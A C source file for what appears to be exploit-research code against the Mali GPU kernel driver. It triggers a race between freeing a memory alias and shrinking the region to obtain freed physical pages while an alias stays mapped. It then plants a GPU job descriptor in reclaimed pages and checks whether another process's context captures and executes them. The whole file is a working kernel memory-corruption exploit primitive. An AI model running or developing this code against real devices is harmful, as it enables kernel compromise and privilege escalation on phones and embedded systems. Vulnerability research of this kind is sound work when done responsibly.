/*
 * mali_alias_xprocess_reclaim_probe.c
 *
 * Tests whether physical pages freed from one Mali context (after the alias
 * race) can be captured by a DIFFERENT Mali context in a child process.
 *
 * Prior work established:
 *   - Same-context reclaim works immediately (mali_alias_reuse_timing_probe)
 *   - Same-context controlled injection works (mali_alias_controlled_injection_probe)
 *   - ION system-heap uses DISJOINT physical pools (mali_alias_ion_cross_pool_probe)
 *
 * Key question: do freed Mali pages go to a per-context pool (invisible to other
 * contexts), or to the OS page allocator (shared across all processes)?
 *
 * The r5p0 driver's kbase_context_term() calls kbase_mem_pool_term() which
 * calls kbase_mem_pool_evict() — releasing all per-context pages back to the OS
 * page allocator. So closing the mali0 fd SHOULD drain the per-context pool.
 *
 * Strategy:
 *   1. Parent: open mali0, run alias race, win, seed freed reclaim page with
 *      WRITE_VALUE descriptor + JC_SENTINEL.
 *   2. Parent: FREE the seeded reclaim buffer (pages → per-context pool).
 *   3. Parent: CLOSE mali0 fd (triggers context term → pages → OS allocator).
 *   4. Child:  open its own mali0, allocate up to MAX_CONSUMER_ALLOCS pages,
 *              check each for JC_SENTINEL via CPU map.
 *   5. If sentinel found: report SENTINEL_HIT + optionally submit as JC.
 *      If not found:      report NO_HIT.
 *
 * Communication: pipe from child to parent for result string.
 *
 * Safety: fork+alarm, single-atom submissions, bounded allocations.
 */

#define _GNU_SOURCE
#define _FILE_OFFSET_BITS 64

#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <unistd.h>

#define MALI_IOCTL(size) _IOC(_IOC_READ | _IOC_WRITE, 0x80, 0, (size))

#define UKP_FUNC_ID_CHECK_VERSION 0
#define UK_FUNC_ID                512
#define KBASE_FUNC_MEM_ALLOC      (UK_FUNC_ID + 0)
#define KBASE_FUNC_MEM_COMMIT     (UK_FUNC_ID + 2)
#define KBASE_FUNC_MEM_QUERY      (UK_FUNC_ID + 3)
#define KBASE_FUNC_MEM_FREE       (UK_FUNC_ID + 4)
#define KBASE_FUNC_MEM_ALIAS      (UK_FUNC_ID + 6)
#define KBASE_FUNC_SET_FLAGS      (UK_FUNC_ID + 18)
#define KBASE_FUNC_JOB_SUBMIT     (UK_FUNC_ID + 28)

#define BASE_MEM_PROT_CPU_RD      (1U << 0)
#define BASE_MEM_PROT_CPU_WR      (1U << 1)
#define BASE_MEM_PROT_GPU_RD      (1U << 2)
#define BASE_MEM_PROT_GPU_WR      (1U << 3)
#define BASE_MEM_GROW_ON_GPF      (1U << 9)
#define BASE_MEM_COHERENT_LOCAL   (1U << 11)

#define KBASE_MEM_QUERY_COMMIT_SIZE 1

#define BASE_JD_REQ_CS            (1U << 1)
#define MALI_WRITE_VALUE_TYPE_ZERO 3

#define BASE_JD_EVENT_DONE               0x00000001
#define BASE_JD_EVENT_DATA_INVALID_FAULT 0x00000058
#define BASE_JD_EVENT_JOB_CANCELLED      0x00004002
#define BASE_JD_EVENT_JOB_INVALID        0x00004003

#define PAGE_BYTES          4096U
#define NATIVE_PAGES        16U
#define SOURCE_OFFSET_PAGES 8U
#define SOURCE_PAGES        8U
#define RECLAIM_PAGES       8U
#define MAX_RACE_ITERS      20
#define MAX_RECLAIM_ALLOCS  8
#define MAX_CONSUMER_ALLOCS 40   /* how many pages the child allocates to search */

#define SOURCE_ID_NONE      0xFFU
#define CANARY64            0xDEADBEEFCAFEBABEULL
#define SCRATCH64           0xAAAAAAAAAAAAAAAAULL
#define JC_SENTINEL         0x4a43534545443030ULL  /* "JCSEED00" */
#define JC_META_MAGIC       0x4a434d4554413030ULL  /* "JCMETA00" */
#define JC_SENTINEL_WORD    16U

/* ---- struct definitions (unchanged from controlled injection probe) ---- */

typedef union {
    uint32_t id;
    uint32_t ret;
    uint64_t align;
} uk_header;

struct uku_version_check_args {
    uk_header header;
    uint16_t  major;
    uint16_t  minor;
    uint8_t   padding[4];
};

struct kbase_uk_set_flags {
    uk_header header;
    uint32_t  create_flags;
    uint32_t  padding;
};

struct kbase_uk_mem_alloc {
    uk_header header;
    uint64_t  va_pages;
    uint64_t  commit_pages;
    uint64_t  extent;
    uint32_t  flags;
    uint32_t  pad0;
    uint64_t  gpu_va;
    uint16_t  va_alignment;
    uint8_t   pad1[6];
};

struct kbase_uk_mem_commit {
    uk_header header;
    uint64_t  gpu_addr;
    uint64_t  pages;
    uint32_t  result_subcode;
    uint32_t  padding;
};

struct kbase_uk_mem_query {
    uk_header header;
    uint64_t  gpu_addr;
    uint64_t  query;
    uint64_t  value;
};

struct kbase_uk_mem_free {
    uk_header header;
    uint64_t  gpu_addr;
};

struct base_mem_aliasing_info {
    uint64_t handle;
    uint64_t offset;
    uint64_t length;
};

struct kbase_uk_mem_alias {
    uk_header header;
    uint64_t  flags;
    uint64_t  stride;
    uint64_t  nents;
    uint64_t  ai;
    uint64_t  gpu_va;
    uint64_t  va_pages;
};

struct base_jd_udata       { uint64_t blob[2]; };
struct base_dependency     { uint8_t atom_id; uint8_t dependency_type; };

struct base_jd_atom_v2_old56 {
    uint64_t             jc;
    struct base_jd_udata udata;
    uint64_t             extres_list;
    uint16_t             nr_extres;
    uint16_t             core_req;
    struct base_dependency pre_dep[2];
    uint8_t              atom_number;
    uint8_t              prio;
    uint8_t              device_nr;
    uint8_t              padding[5];
    uint8_t              extra[8];
};

struct kbase_uk_job_submit_trace {
    uk_header header;
    uint64_t  addr;
    uint32_t  nr_atoms;
    uint32_t  stride;
    uint32_t  gles_ctx_handle;
    uint32_t  padding;
};

struct base_jd_event_v2 {
    uint32_t             event_code;
    uint8_t              atom_number;
    uint8_t              pad[3];
    struct base_jd_udata udata;
};

/* ---- thread globals for the alias race ---- */

static int              g_fd         = -1;
static volatile int     g_ready      = 0;
static int              g_commit_ret = -1;
static uint64_t         g_alias_gpu_va  = 0;
static uint64_t         g_native_gpu_va = 0;

/* ---- Mali helper functions ---- */

static int mali_ioctl(int fd, void *buf, size_t size)
{
    errno = 0;
    return ioctl(fd, MALI_IOCTL(size), buf);
}

static int mali_init(int fd)
{
    struct uku_version_check_args ver;
    struct kbase_uk_set_flags     flags;
    void *mtp;

    memset(&ver, 0, sizeof(ver));
    ver.header.id = UKP_FUNC_ID_CHECK_VERSION;
    ver.major = 10;
    ver.minor = 2;
    if (mali_ioctl(fd, &ver, sizeof(ver)) < 0 || ver.header.ret != 0)
        return -1;

    memset(&flags, 0, sizeof(flags));
    flags.header.id = KBASE_FUNC_SET_FLAGS;
    if (mali_ioctl(fd, &flags, sizeof(flags)) < 0 || flags.header.ret != 0)
        return -1;

    mtp = (void *)syscall(__NR_mmap2, (unsigned long)NULL, (size_t)PAGE_BYTES,
                          PROT_NONE, MAP_SHARED, fd, (unsigned long)2);
    if (mtp == MAP_FAILED)
        mtp = (void *)syscall(__NR_mmap2, (unsigned long)NULL, (size_t)PAGE_BYTES,
                              PROT_NONE, MAP_SHARED, fd, (unsigned long)3);
    return (mtp == MAP_FAILED) ? -1 : 0;
}

static uint64_t mali_alloc_ext(int fd, uint64_t va_pages, uint64_t commit_pages,
                                uint64_t extent, uint32_t flags)
{
    struct kbase_uk_mem_alloc alloc;

    memset(&alloc, 0, sizeof(alloc));
    alloc.header.id    = KBASE_FUNC_MEM_ALLOC;
    alloc.va_pages     = va_pages;
    alloc.commit_pages = commit_pages;
    alloc.extent       = extent;
    alloc.flags        = flags;
    if (mali_ioctl(fd, &alloc, sizeof(alloc)) < 0)
        return 0;
    return alloc.header.ret == 0 ? alloc.gpu_va : 0;
}

static uint64_t mali_alloc_flags(int fd, uint64_t pages, uint32_t flags)
{
    return mali_alloc_ext(fd, pages, pages, pages, flags);
}

static int mali_commit(int fd, uint64_t gpu_va, uint64_t pages)
{
    struct kbase_uk_mem_commit commit;

    memset(&commit, 0, sizeof(commit));
    commit.header.id  = KBASE_FUNC_MEM_COMMIT;
    commit.gpu_addr   = gpu_va;
    commit.pages      = pages;
    mali_ioctl(fd, &commit, sizeof(commit));
    return commit.header.ret;
}

static uint64_t mali_query_commit(int fd, uint64_t gpu_va)
{
    struct kbase_uk_mem_query query;

    memset(&query, 0, sizeof(query));
    query.header.id = KBASE_FUNC_MEM_QUERY;
    query.gpu_addr  = gpu_va;
    query.query     = KBASE_MEM_QUERY_COMMIT_SIZE;
    mali_ioctl(fd, &query, sizeof(query));
    return query.value;
}

static uint64_t mali_alias(int fd, uint64_t src_gpu_va, uint64_t offset_pages,
                            uint64_t length_pages)
{
    struct base_mem_aliasing_info info;
    struct kbase_uk_mem_alias     alias;

    memset(&info, 0, sizeof(info));
    info.handle = src_gpu_va;
    info.offset = offset_pages;
    info.length = length_pages;

    memset(&alias, 0, sizeof(alias));
    alias.header.id = KBASE_FUNC_MEM_ALIAS;
    alias.flags     = BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
    alias.stride    = length_pages;
    alias.nents     = 1;
    alias.ai        = (uint64_t)(uintptr_t)&info;
    if (mali_ioctl(fd, &alias, sizeof(alias)) < 0)
        return 0;
    return alias.header.ret == 0 ? alias.gpu_va : 0;
}

static void mali_free(int fd, uint64_t gpu_va)
{
    struct kbase_uk_mem_free free_req;

    if (!gpu_va)
        return;
    memset(&free_req, 0, sizeof(free_req));
    free_req.header.id  = KBASE_FUNC_MEM_FREE;
    free_req.gpu_addr   = gpu_va;
    mali_ioctl(fd, &free_req, sizeof(free_req));
}

static void *mali_cpu_map(int fd, uint64_t gpu_va, size_t bytes)
{
    return (void *)syscall(__NR_mmap2, (unsigned long)NULL, bytes,
                           PROT_READ | PROT_WRITE, MAP_SHARED, fd,
                           (unsigned long)(gpu_va >> 12));
}

static int read_event(int fd, struct base_jd_event_v2 *ev)
{
    struct pollfd pfd = { fd, POLLIN | POLLERR | POLLHUP, 0 };

    if (poll(&pfd, 1, 3000) <= 0)
        return -1;
    return read(fd, ev, sizeof(*ev)) == (ssize_t)sizeof(*ev) ? 0 : -1;
}

static void build_wv_desc(uint32_t *jc_cpu, uint64_t target_gpu_va)
{
    memset(jc_cpu, 0, 56);
    jc_cpu[4]  = 0x00010005;
    jc_cpu[8]  = (uint32_t)target_gpu_va;
    jc_cpu[9]  = (uint32_t)(target_gpu_va >> 32);
    jc_cpu[10] = MALI_WRITE_VALUE_TYPE_ZERO;
}

static int submit_jc(int fd, uint64_t jc_gpu_va, uint8_t atom_number,
                     uint32_t *event_code_out)
{
    struct base_jd_atom_v2_old56      atom;
    struct kbase_uk_job_submit_trace  submit;
    struct base_jd_event_v2           ev;

    memset(&atom, 0, sizeof(atom));
    atom.jc          = jc_gpu_va;
    atom.core_req    = BASE_JD_REQ_CS;
    atom.atom_number = atom_number;
    atom.udata.blob[0] = 0xBEEF000000000000ULL | atom_number;

    memset(&submit, 0, sizeof(submit));
    submit.header.id = KBASE_FUNC_JOB_SUBMIT;
    submit.addr      = (uint64_t)(uintptr_t)&atom;
    submit.nr_atoms  = 1;
    submit.stride    = sizeof(atom);
    if (mali_ioctl(fd, &submit, sizeof(submit)) < 0 || submit.header.ret != 0)
        return -1;
    if (read_event(fd, &ev) < 0)
        return -1;
    if (event_code_out)
        *event_code_out = ev.event_code;
    return 0;
}

/* source page tagging — same scheme as controlled injection probe */
static uint64_t source_tag(uint8_t source_id)
{
    return CANARY64 ^ ((uint64_t)(source_id + 1U) << 56);
}

static int source_tag_to_id(uint64_t value)
{
    uint8_t id;
    for (id = 0; id < SOURCE_PAGES; id++) {
        if (value == source_tag(id))
            return (int)id;
    }
    return -1;
}

static void fill_source_tags(uint8_t *cpu_base)
{
    size_t page, word;
    size_t words_per_page = PAGE_BYTES / sizeof(uint64_t);

    for (page = 0; page < SOURCE_PAGES; page++) {
        uint64_t value = source_tag((uint8_t)page);
        uint64_t *pcpu = (uint64_t *)(cpu_base + (SOURCE_OFFSET_PAGES + page) * PAGE_BYTES);
        for (word = 0; word < words_per_page; word++)
            pcpu[word] = value;
    }
}

static int ranges_overlap(uint64_t sa, uint64_t pa, uint64_t sb, uint64_t pb)
{
    return !((sa + pa * PAGE_BYTES <= sb) || (sb + pb * PAGE_BYTES <= sa));
}

static void seed_descriptor_page(uint64_t *page_cpu, uint64_t target_gpu_va,
                                  uint8_t source_id)
{
    uint32_t *jc_cpu = (uint32_t *)page_cpu;

    memset(page_cpu, 0, PAGE_BYTES);
    build_wv_desc(jc_cpu, target_gpu_va);
    page_cpu[JC_SENTINEL_WORD]     = JC_SENTINEL;
    page_cpu[JC_SENTINEL_WORD + 1] = (JC_META_MAGIC & ~0xFFULL) | (uint64_t)source_id;
    page_cpu[JC_SENTINEL_WORD + 2] = target_gpu_va;
    __builtin___clear_cache((char *)page_cpu, (char *)page_cpu + PAGE_BYTES);
    __sync_synchronize();
}

static int find_seeded_page(const uint64_t *cpu_base, size_t pages,
                            size_t *page_index_out, uint8_t *source_id_out)
{
    size_t i;
    size_t page_stride = PAGE_BYTES / sizeof(uint64_t);

    for (i = 0; i < pages; i++) {
        const uint64_t *pcpu = cpu_base + i * page_stride;
        if (pcpu[JC_SENTINEL_WORD] == JC_SENTINEL &&
            (pcpu[JC_SENTINEL_WORD + 1] & ~0xFFULL) == (JC_META_MAGIC & ~0xFFULL)) {
            *page_index_out  = i;
            *source_id_out   = (uint8_t)(pcpu[JC_SENTINEL_WORD + 1] & 0xFFU);
            return 1;
        }
    }
    return 0;
}

/* ---- thread functions for the alias race ---- */

static void *thread_free(void *arg)
{
    (void)arg;
    while (!g_ready) {}
    mali_free(g_fd, g_alias_gpu_va);
    return NULL;
}

static void *thread_commit(void *arg)
{
    (void)arg;
    while (!g_ready) {}
    g_commit_ret = mali_commit(g_fd, g_native_gpu_va, SOURCE_OFFSET_PAGES);
    return NULL;
}

/* ---- consumer: runs in child after parent closes fd ---- */

static void run_consumer(int result_pipe, int verbose)
{
    int       fd;
    int       i;
    uint64_t  gpu_va;
    uint64_t *cpu;
    size_t    page_index;
    uint8_t   source_id;

    fd = open("/dev/mali0", O_RDWR);
    if (fd < 0) {
        dprintf(result_pipe, "CONSUMER_OPEN_FAILED errno=%d\n", errno);
        return;
    }

    if (mali_init(fd) < 0) {
        dprintf(result_pipe, "CONSUMER_INIT_FAILED\n");
        close(fd);
        return;
    }

    if (verbose)
        printf("[child] Consumer opened /dev/mali0 fd=%d, allocating %d pages...\n",
               fd, MAX_CONSUMER_ALLOCS);

    for (i = 0; i < MAX_CONSUMER_ALLOCS; i++) {
        gpu_va = mali_alloc_flags(fd, 1,
                                  BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                                  BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                                  BASE_MEM_GROW_ON_GPF);
        if (!gpu_va)
            continue;

        cpu = mali_cpu_map(fd, gpu_va, PAGE_BYTES);
        if (cpu == MAP_FAILED) {
            mali_free(fd, gpu_va);
            continue;
        }

        if (find_seeded_page(cpu, 1, &page_index, &source_id)) {
            uint32_t event_code = 0;
            int      submit_ok  = 0;

            printf("[child] SENTINEL_HIT alloc=%d gpu_va=0x%llx source_id=%u\n",
                   i, (unsigned long long)gpu_va, source_id);

            /*
             * Try to execute the preserved seeded descriptor as a JC.
             * The target GPU VA baked into the descriptor is from the dead
             * parent context, so expect DATA_INVALID_FAULT or JOB_CANCELLED —
             * but DONE would indicate cross-process JC execution from stale pages.
             */
            if (submit_jc(fd, gpu_va, 0x20, &event_code) == 0) {
                submit_ok = 1;
                printf("[child] seeded JC submit: event=0x%x (%s)\n",
                       event_code,
                       event_code == BASE_JD_EVENT_DONE               ? "DONE" :
                       event_code == BASE_JD_EVENT_DATA_INVALID_FAULT ? "DATA_INVALID_FAULT" :
                       event_code == BASE_JD_EVENT_JOB_CANCELLED      ? "JOB_CANCELLED" :
                       event_code == BASE_JD_EVENT_JOB_INVALID        ? "JOB_INVALID" : "UNKNOWN");
            }

            dprintf(result_pipe,
                    "SENTINEL_HIT alloc_index=%d source_id=%u submit_ok=%d event=0x%x\n",
                    i, source_id, submit_ok, event_code);

            munmap(cpu, PAGE_BYTES);
            mali_free(fd, gpu_va);
            close(fd);
            return;
        }

        munmap(cpu, PAGE_BYTES);
        mali_free(fd, gpu_va);
    }

    printf("[child] NO_HIT after %d allocs\n", MAX_CONSUMER_ALLOCS);
    dprintf(result_pipe, "NO_HIT allocs=%d\n", MAX_CONSUMER_ALLOCS);
    close(fd);
}

/* ---- main seeder + cross-process consumer logic ---- */

static void do_test(void)
{
    int     fd;
    int     iter;
    int     race_won       = 0;
    int     result_pipe[2] = { -1, -1 };

    fd = open("/dev/mali0", O_RDWR);
    if (fd < 0) {
        printf("[!] Cannot open /dev/mali0: %s\n", strerror(errno));
        return;
    }

    if (mali_init(fd) < 0) {
        printf("[!] mali_init failed\n");
        close(fd);
        return;
    }
    printf("[*] Opened /dev/mali0 fd=%d\n", fd);

    /* Quick prerequisite: confirm alias shrink-block works */
    {
        uint64_t nv = mali_alloc_flags(fd, NATIVE_PAGES,
                                       BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                                       BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                                       BASE_MEM_GROW_ON_GPF);
        uint64_t av = nv ? mali_alias(fd, nv, SOURCE_OFFSET_PAGES, SOURCE_PAGES) : 0;
        int sw_a = av ? mali_commit(fd, nv, SOURCE_OFFSET_PAGES) : -1;
        if (av) mali_free(fd, av);
        int sw_b = nv ? mali_commit(fd, nv, SOURCE_OFFSET_PAGES) : -1;
        if (nv) mali_free(fd, nv);
        if (sw_a == 0 || sw_b != 0) {
            printf("[!] Prereq FAILED: shrink_with_alias=%d shrink_without_alias=%d\n",
                   sw_a, sw_b);
            close(fd);
            return;
        }
        printf("[*] Prereq PASSED\n");
    }

    for (iter = 0; iter < MAX_RACE_ITERS && !race_won; iter++) {
        uint64_t  native_va      = 0;
        uint64_t  alias_va       = 0;
        uint64_t  guard_va       = 0;
        uint64_t  reclaim_va     = 0;
        uint64_t  scratch_va     = 0;
        uint8_t  *native_cpu     = MAP_FAILED;
        uint64_t *reclaim_cpu    = MAP_FAILED;
        uint64_t *scratch_cpu    = MAP_FAILED;
        pthread_t t_free, t_commit;
        int       reclaim_i;

        /* Allocate 16-page native region */
        native_va = mali_alloc_flags(fd, NATIVE_PAGES,
                                     BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                                     BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                                     BASE_MEM_GROW_ON_GPF);
        if (!native_va)
            goto iter_cleanup;

        native_cpu = mali_cpu_map(fd, native_va, NATIVE_PAGES * PAGE_BYTES);
        if (native_cpu == MAP_FAILED)
            goto iter_cleanup;

        fill_source_tags(native_cpu);
        __sync_synchronize();

        /* Create alias over pages 8-15 */
        alias_va = mali_alias(fd, native_va, SOURCE_OFFSET_PAGES, SOURCE_PAGES);
        if (!alias_va)
            goto iter_cleanup;

        /* Set up and fire the race */
        g_fd = fd;
        g_alias_gpu_va  = alias_va;
        g_native_gpu_va = native_va;
        g_ready         = 0;
        g_commit_ret    = -1;

        pthread_create(&t_free,   NULL, thread_free,   NULL);
        pthread_create(&t_commit, NULL, thread_commit, NULL);
        __sync_synchronize();
        g_ready = 1;
        pthread_join(t_free,   NULL);
        pthread_join(t_commit, NULL);

        printf("[iter %2d] commit_ret=%d alias_va=0x%llx\n",
               iter, g_commit_ret, (unsigned long long)alias_va);

        if (g_commit_ret != 0) {
            /* Race LOST — alias freed before shrink could proceed. Try again. */
            goto iter_cleanup;
        }

        /* Race WON: native shrunk to 8 pages, pages 8-15 freed, alias still mapped */

        /* Reserve the old alias VA window with commit=0 to prevent overlap confounds */
        guard_va = mali_alloc_ext(fd, SOURCE_PAGES, 0, SOURCE_PAGES,
                                  BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                                  BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                                  BASE_MEM_GROW_ON_GPF);
        if (!guard_va || guard_va != alias_va) {
            printf("[iter %2d] guard miss: guard_va=0x%llx alias_va=0x%llx — skipping\n",
                   iter, (unsigned long long)guard_va, (unsigned long long)alias_va);
            if (guard_va)
                mali_free(fd, guard_va);
            goto iter_cleanup;
        }
        printf("[iter %2d] guard reserved alias window at 0x%llx\n",
               iter, (unsigned long long)guard_va);

        /* Allocate disjoint 8-page reclaim buffers, look for source-tagged pages */
        for (reclaim_i = 0; reclaim_i < MAX_RECLAIM_ALLOCS && !race_won; reclaim_i++) {
            uint8_t source_ids[RECLAIM_PAGES];
            int     source_count;
            size_t  page_j;
            int     overlap;

            reclaim_va  = mali_alloc_flags(fd, RECLAIM_PAGES,
                                           BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                                           BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                                           BASE_MEM_GROW_ON_GPF);
            if (!reclaim_va)
                break;

            reclaim_cpu = mali_cpu_map(fd, reclaim_va, RECLAIM_PAGES * PAGE_BYTES);
            if (reclaim_cpu == MAP_FAILED) {
                mali_free(fd, reclaim_va);
                reclaim_va = 0;
                break;
            }

            overlap = ranges_overlap(reclaim_va, RECLAIM_PAGES, alias_va, SOURCE_PAGES);
            memset(source_ids, SOURCE_ID_NONE, sizeof(source_ids));
            source_count = 0;
            for (page_j = 0; page_j < RECLAIM_PAGES; page_j++) {
                const uint64_t *pcpu = reclaim_cpu + page_j * (PAGE_BYTES / sizeof(uint64_t));
                int sid = source_tag_to_id(pcpu[0]);
                if (sid >= 0) {
                    source_ids[page_j] = (uint8_t)sid;
                    source_count++;
                }
            }

            printf("[iter %2d] reclaim[%d] va=0x%llx overlap=%d source_count=%d\n",
                   iter, reclaim_i, (unsigned long long)reclaim_va, overlap, source_count);

            if (overlap || source_count == 0) {
                munmap(reclaim_cpu, RECLAIM_PAGES * PAGE_BYTES);
                reclaim_cpu = MAP_FAILED;
                mali_free(fd, reclaim_va);
                reclaim_va = 0;
                continue;
            }

            /* Found disjoint reclaim pages carrying source tags — seed page 0 */
            scratch_va = mali_alloc_flags(fd, 1,
                                          BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                                          BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                                          BASE_MEM_COHERENT_LOCAL);
            if (!scratch_va) {
                munmap(reclaim_cpu, RECLAIM_PAGES * PAGE_BYTES);
                reclaim_cpu = MAP_FAILED;
                mali_free(fd, reclaim_va);
                reclaim_va = 0;
                break;
            }

            scratch_cpu = mali_cpu_map(fd, scratch_va, PAGE_BYTES);
            if (scratch_cpu == MAP_FAILED) {
                mali_free(fd, scratch_va);
                scratch_va = 0;
                munmap(reclaim_cpu, RECLAIM_PAGES * PAGE_BYTES);
                reclaim_cpu = MAP_FAILED;
                mali_free(fd, reclaim_va);
                reclaim_va = 0;
                break;
            }

            /* Seed the first source-tagged page with WRITE_VALUE + JC_SENTINEL */
            for (page_j = 0; page_j < RECLAIM_PAGES; page_j++) {
                if (source_ids[page_j] != SOURCE_ID_NONE) {
                    uint64_t *pcpu = reclaim_cpu + page_j * (PAGE_BYTES / sizeof(uint64_t));
                    seed_descriptor_page(pcpu, scratch_va, source_ids[page_j]);
                    printf("[iter %2d] seeded reclaim page %zu (source_id=%u) targeting scratch 0x%llx\n",
                           iter, page_j, source_ids[page_j], (unsigned long long)scratch_va);
                    break;
                }
            }

            /* Free the seeded reclaim buffer → pages return to per-context pool */
            munmap(scratch_cpu, PAGE_BYTES);
            scratch_cpu = MAP_FAILED;
            munmap(reclaim_cpu, RECLAIM_PAGES * PAGE_BYTES);
            reclaim_cpu = MAP_FAILED;
            mali_free(fd, reclaim_va);
            reclaim_va = 0;
            mali_free(fd, scratch_va);
            scratch_va = 0;

            race_won = 1;
            printf("[iter %2d] Reclaim seeded and freed. Closing seeder context...\n", iter);
        }

iter_cleanup:
        if (reclaim_cpu != MAP_FAILED) {
            munmap(reclaim_cpu, RECLAIM_PAGES * PAGE_BYTES);
            reclaim_cpu = MAP_FAILED;
        }
        if (scratch_cpu != MAP_FAILED) {
            munmap(scratch_cpu, PAGE_BYTES);
            scratch_cpu = MAP_FAILED;
        }
        if (reclaim_va) { mali_free(fd, reclaim_va); reclaim_va = 0; }
        if (scratch_va) { mali_free(fd, scratch_va); scratch_va = 0; }
        if (guard_va)   { mali_free(fd, guard_va);   guard_va   = 0; }
        if (native_cpu != MAP_FAILED) {
            munmap(native_cpu, NATIVE_PAGES * PAGE_BYTES);
            native_cpu = MAP_FAILED;
        }
        if (native_va)  { mali_free(fd, native_va);  native_va  = 0; }
        /* alias was freed by thread_free */
        alias_va = 0;
    }

    if (!race_won) {
        printf("[!] No race win with disjoint reclaim in %d iterations\n", MAX_RACE_ITERS);
        close(fd);
        return;
    }

    /*
     * KEY STEP: close the seeder fd.
     * kbase_context_term() -> kbase_mem_pool_term() -> kbase_mem_pool_evict()
     * returns all per-context cached pages to the OS page allocator.
     * If those pages are now available system-wide, the child's mali0 context
     * will pick them up on the first allocation.
     */
    printf("[*] Closing seeder mali0 fd=%d (draining per-context pool to OS)...\n", fd);
    close(fd);
    fd = -1;
    usleep(50000); /* 50ms — let the OS settle the page pool */

    /* Fork consumer child */
    if (pipe(result_pipe) < 0) {
        printf("[!] pipe() failed: %s\n", strerror(errno));
        return;
    }

    pid_t cpid = fork();
    if (cpid < 0) {
        printf("[!] fork() failed: %s\n", strerror(errno));
        close(result_pipe[0]);
        close(result_pipe[1]);
        return;
    }

    if (cpid == 0) {
        /* child */
        alarm(30);
        close(result_pipe[0]);
        run_consumer(result_pipe[1], 1);
        close(result_pipe[1]);
        exit(0);
    }

    /* parent: read result */
    close(result_pipe[1]);
    {
        char    buf[512];
        ssize_t n = read(result_pipe[0], buf, sizeof(buf) - 1);
        if (n > 0) {
            buf[n] = '\0';
            printf("\n=== CROSS-PROCESS CONSUMER RESULT ===\n%s", buf);
            if (strstr(buf, "SENTINEL_HIT"))
                printf("*** POSITIVE: freed Mali pages captured by foreign context ***\n");
            else
                printf("*** NEGATIVE: Mali pages NOT captured by foreign context (disjoint pool) ***\n");
        }
    }
    close(result_pipe[0]);

    int status;
    waitpid(cpid, &status, 0);
}

int main(void)
{
    pid_t pid;
    int   status;

    printf("=== mali_alias_xprocess_reclaim_probe ===\n");
    printf("Tests cross-process Mali page capture after seeder context close\n\n");

    pid = fork();
    if (pid < 0) {
        perror("fork");
        return 1;
    }
    if (pid == 0) {
        alarm(120);
        do_test();
        exit(0);
    }

    waitpid(pid, &status, 0);
    if (WIFEXITED(status))
        printf("\n[*] Exited with code %d\n", WEXITSTATUS(status));
    else if (WIFSIGNALED(status))
        printf("\n[!] Killed by signal %d\n", WTERMSIG(status));

    return 0;
}
